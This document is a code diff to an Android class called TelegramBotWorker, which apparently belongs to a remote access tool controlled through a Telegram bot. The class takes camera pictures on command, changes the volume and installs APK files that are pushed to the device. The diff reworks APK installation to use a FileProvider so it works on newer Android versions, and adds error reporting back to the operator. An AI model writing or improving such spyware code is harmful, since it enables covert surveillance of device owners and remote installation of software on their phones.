@@ -8,6 +8,7 @@ import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
 import android.net.Uri;
 import android.provider.Settings;
+import androidx.core.content.FileProvider;
 import org.json.JSONArray;
 import org.json.JSONObject;
 import java.io.ByteArrayOutputStream;
@@ -206,7 +207,7 @@ public class TelegramBotWorker implements Runnable {
             }
         } catch (Exception e) { ErrorLogger.logError(context, "HandleCallback", e); }
     }
-    
+
     private void handleCameraCapture(String cameraId, String cameraName) {
         sendMessage("Capturing image from " + cameraName + "...", context);
         CameraHandler.takePicture(context, cameraId, new CameraHandler.CameraCallback() {
@@ -251,12 +252,21 @@ public class TelegramBotWorker implements Runnable {
 
     private void installApp(String apkPath) {
         File apkFile = new File(apkPath);
-        if (!apkFile.exists()) { sendMessage("Error: APK file not found.", context); return; }
-        Intent intent = new Intent(Intent.ACTION_VIEW, Uri.fromFile(apkFile));
-        intent.setDataAndType(Uri.fromFile(apkFile), "application/vnd.android.package-archive");
-        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_GRANT_READ_URI_PERMISSION);
-        context.startActivity(intent);
-        sendMessage("Install requested for " + apkFile.getName() + ".", context);
+        if (!apkFile.exists()) {
+            sendMessage("Error: APK file not found after download.", context);
+            return;
+        }
+        try {
+            Uri apkUri = FileProvider.getUriForFile(context, context.getPackageName() + ".provider", apkFile);
+            Intent intent = new Intent(Intent.ACTION_VIEW);
+            intent.setDataAndType(apkUri, "application/vnd.android.package-archive");
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_GRANT_READ_URI_PERMISSION);
+            context.startActivity(intent);
+            sendMessage("Install requested for " + apkFile.getName() + ". Please check the device screen to confirm.", context);
+        } catch (Exception e) {
+            sendMessage("Failed to initiate installation: " + e.getMessage(), context);
+            ErrorLogger.logError(context, "InstallApp", e);
+        }
     }
 
     private void setVolume(String levelStr) {
